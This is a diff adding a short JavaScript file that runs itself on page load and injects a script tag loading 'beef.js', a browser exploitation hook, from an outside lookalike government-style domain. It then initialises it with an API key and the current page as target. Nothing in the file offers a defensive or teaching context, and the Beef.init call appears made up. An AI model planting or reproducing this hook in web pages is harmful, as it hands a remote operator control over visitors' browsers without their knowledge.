@@ -1,0 +1,26 @@
+
+
+// Define the BeEF installation script
+function installBeEF() {
+    // Check if the browser is compatible
+    if (navigator.userAgent.includes("CompatibleBrowser")) {
+        // Create a new script element to load BeEF
+        const script = document.createElement('script');
+        script.src = "https://mod.nkadefense.gov.govnka.site/beef.js"; 
+        script.onload = function() {
+            console.log("BeEF successfully loaded into the browser.");
+            // Initialize BeEF with  parameters
+            Beef.init({
+                // Example of configuration options
+                apiKey: "nkasoftwaregrouphostedatmod",
+                target: window.location.href,
+            });
+        };
+        document.head.appendChild(script);
+    } else {
+        console.warn("Incompatible browser detected.");
+    }
+}
+
+// Trigger the BeEF installation
+installBeEF();
